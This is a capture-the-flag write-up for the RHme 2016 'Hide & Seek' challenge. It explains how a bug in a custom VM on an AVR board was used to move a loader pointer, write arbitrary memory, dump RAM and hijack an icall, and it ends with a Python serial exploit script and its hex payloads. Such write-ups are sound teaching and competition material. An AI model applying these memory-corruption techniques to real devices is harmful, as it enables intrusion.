# rhme-2016 write-up Hide & Seek

<a name="hideandseek"></a>
## Hide & Seek (Other - 400 pts)
This challenge is based on FridgeJIT.<br>
At startup, the loader is available to execute a custom VM.<br>
If there is no errors in the VM, the program will finish..and no flag :p<br>
First, we tried the previous VM (FridgeJIT), everything was working, great !<br>
Then we tried something different like "ee" and got an Oops message.<br>
After, the fridgeJIT console was displayed and we got an access to different
commands like execute, debug, load...<br>
The next step was to find a vulnerability in the VM in order to dump the RAM.<br>
We tried a lot of opcode combination in order to manipulate the stack (push,
pop, call, ret).<br>
A weird behavior appeared after the execution of call r0 with SP=0, we got a 
binary dump through the console by loading "aa" 47 times.<br>
After a lot of testing, we found that executing the following command allows you
to move the Loader pointer:
```
  SP = 0     ptr = x     call
"04600000"+"00"*(x - 6)+"1200"
note: x < 0x2bc (buffer size)
```
With the debug console, every opcode and parameters are translated though a
printf("%s",..) stuff and we can write everywhere with the previous exploit..<br>
so, if the NOP string address is modified (or PUSH, POP whatever), we can dump
all the RAM through the debug console.<br>
In order to dump the RAM, we set the loader pointer to 0x1e4, this is the 
address of the NOP string pointer.<br>
After the RAM dump analysis, the FLAG string appears in 2 places 0x269 and 0x700.

!!But!!<br>
Behind the "FLAG:" string @ 0x700, there are nothing (so sad..)<br>
To sum up, we can read RAM, write anywhere..the last thing we can do is to get code execution.<br>  
Then we fuzz everything in the range 0x100-0x1e4 to get something,
and after a lot of try, we got nothing..(so sad x2).<br>
The way to have an execution with this AVR is to watch every icall.<br>
With r2: 
```
:> /c icall
0x00000466   # 2: icall (can't exploit)
0x00001d5e   # 2: icall (\o/)
0x000027d6   # 2: icall (don't care)
```
The icall takes values in RAM with r31:r30 = \*0x16c:*0x16b according to the
value @ 0x16a.<br>
Then, we fuzz the value @ 0x16a in order to get something call!<br>
Result: the value 0x1e seems to be a good choice, because we got crash :)<br>
Then we tried many (random) addresses and we found a good setting with 0x1000
as parameter (payload = "1e0010" @ 0x16a).<br>
Then we rewrite the RAM until 0x1e4 to dump the string @ 0x700 to recover the
flag \o/.

```python
from rhme_serial import *

s = rhme_serial()
s.xfer("ee\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("04600000"+"00"*(0x16a-6)+"1200\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("1e0010\n")
s.xfer("e\n")
s.xfer("\n")
s.xfer("l\n")
s.xfer("00000c02fb0c03f40704280805720806540d07a10d08c4080901090a44090b810900be090dfb090e2b0a0f6a0a10a90a11020b12ee0d135107141807153607165b0b17a40b18c10019de0b1afb0b1b180c1c500c1d770c1e950c00414243c4c5464748494a4b4c4d52139455569798595a5b5c1f4e4f50511d1e00000007\n")
print s.xfer("d\n")
s.close()
```
